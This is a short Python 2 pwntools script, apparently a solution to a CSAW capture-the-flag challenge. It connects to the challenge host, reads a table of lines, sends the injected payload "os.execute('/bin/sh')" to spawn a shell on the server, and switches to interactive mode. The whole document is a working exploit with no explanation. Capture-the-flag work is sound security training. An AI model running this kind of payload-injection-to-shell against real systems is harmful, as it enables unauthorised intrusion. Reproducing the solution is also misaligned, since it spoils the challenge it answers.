#!/usr/bin/env python2

from pwn import *

p = remote('pwn.chal.csaw.io', 8001)
p.recvline()
table = p.recvlines(8)
p.sendline("os.execute('/bin/sh')")
p.interactive()
